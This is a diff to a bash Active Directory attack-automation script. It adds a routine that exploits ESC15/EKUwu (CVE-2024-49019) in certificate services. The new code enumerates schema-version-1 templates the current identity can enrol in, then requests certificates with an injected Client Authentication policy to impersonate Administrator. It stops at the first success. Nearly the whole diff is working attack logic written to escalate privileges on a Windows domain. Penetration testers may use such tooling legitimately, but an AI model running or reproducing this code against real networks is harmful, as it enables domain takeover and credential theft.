@@ -22,7 +22,7 @@ set -o pipefail
 # ===========================================================================
 #  METADATA
 # ===========================================================================
-readonly VERSION="1.14.0"
+readonly VERSION="1.15.0"
 readonly AUTHOR="c4sh3r"
 KERBRUTE_BIN="${KERBRUTE_BIN:-/opt/kerbrute}"
 
@@ -866,6 +866,7 @@ phase_adcs() {
     fi
     echo "$cout" | tee -a "$LOGFILE"; echo "$cout" >"$OUTDIR/certipy_find_$(_safe_name "$USER").txt"
 
+    local ca; ca=$(grep -ioP 'CA Name\s*:\s*\K\S+' <<<"$cout" | head -1)
     if grep -qiE 'ESC[0-9]+' <<<"$cout"; then
         local escs; escs=$(grep -oiE 'ESC[0-9]+' <<<"$cout" | sort -u | tr '\n' ' ')
         loot "★★★ ${USER} can abuse ADCS: $escs ★★★"
@@ -875,6 +876,13 @@ phase_adcs() {
         _abuse_adcs "$cout" && ADCS_PWNED=1
     else
         info "No templates ${USER} can abuse (enrolment rights gate ESC detection — a later identity may differ)"
+    fi
+    # ESC15/EKUwu is the blind spot: certipy -vulnerable frequently does NOT flag it
+    # even on a default v1 template (WebServer/SubCA) that ANY enrolment-capable user
+    # can abuse. So if we haven't reached Administrator, try ESC15 generically against
+    # whatever templates THIS identity can enrol (parsed, not hard-coded).
+    if [[ "$ADCS_PWNED" != "1" && "$DO_ABUSE" == "1" && -n "$ca" ]]; then
+        _adcs_esc15_blind "$ca" && ADCS_PWNED=1
     fi
 }
 
@@ -1793,6 +1801,40 @@ _adcs_relay() {
     local pfx; pfx=$(ls -t "$OUTDIR"/*dc*.pfx "$OUTDIR"/*.pfx 2>/dev/null | head -1 | xargs -r basename)
     [[ -n "$pfx" ]] && { _adcs_pwn_pfx "$pfx" "$esc" "$DC_HOST\$"; return $?; }
     warn "  ${esc}: no cert captured — run the relay+coercion manually with your listener"; return 1
+}
+
+# ESC15 (EKUwu, CVE-2024-49019) — NOT a per-template misconfig, so certipy
+# -vulnerable usually doesn't flag it: ANY schema-version-1 template you can enrol
+# (e.g. the stock WebServer) lets you inject a Client-Authentication application
+# policy and authenticate as someone else. We therefore detect it ourselves —
+# precisely, NOT blindly: only v1 templates THIS identity can enrol (its name, its
+# groups, or Authenticated/Domain Users in the enrolment rights). Generic, no
+# hard-coded template/box. Stops at the first Administrator.
+_adcs_esc15_blind() {
+    local ca="$1"; have certipy || return 1
+    _adcs_setauth
+    subsection "ESC15/EKUwu check — v1 templates ${USER} can enrol (certipy doesn't flag these)"
+    local full; full=$( "${_ADCS_ENV[@]}" timeout -k 15 "${CERTIPY_TO:-120}" certipy find "${_ADCS_AUTH[@]}" \
+        -dc-ip "$DC_IP" -target "${DC_FQDN:-$DCT}" -stdout -enabled 2>&1 )
+    # principals that mean "we can enrol": broad ones + us + our groups
+    local princ="Authenticated Users|Domain Users|Domain Computers|${USER}"
+    local g="${OWNED_GROUPS[${USER,,}]:-}"
+    [[ -n "$g" && "$g" != "—" ]] && princ="${princ}|$(sed 's/, */|/g' <<<"$g")"
+    # keep Template Names whose block is Schema Version 1 AND lists an enrolable principal
+    local tpls; tpls=$(awk -v p="$princ" 'BEGIN{IGNORECASE=1}
+        /Template Name/{ if(name!="" && v1 && enr) print name; name=$0; sub(/.*:[[:space:]]*/,"",name); v1=0; enr=0 }
+        /Schema Version.*:[[:space:]]*1[[:space:]]*$/{ v1=1 }
+        p!="" && $0 ~ p { enr=1 }
+        END{ if(name!="" && v1 && enr) print name }' <<<"$full" | sed 's/[[:space:]]*$//' | sort -u)
+    [[ -z "$tpls" ]] && { info "  no enrollable v1 template for ${USER} → ESC15 not applicable as this identity"; return 1; }
+    local t n=0
+    while IFS= read -r t; do
+        [[ -z "$t" ]] && continue
+        (( n++ >= 6 )) && break
+        loot "ESC15 candidate: v1 template '${t}' enrollable by ${USER} → trying EKUwu"
+        _adcs_req_admin "$ca" "$t" "ESC15(EKUwu)" 1 -application-policies 'Client Authentication' && return 0
+    done <<<"$tpls"
+    return 1
 }
 
 _abuse_adcs() {
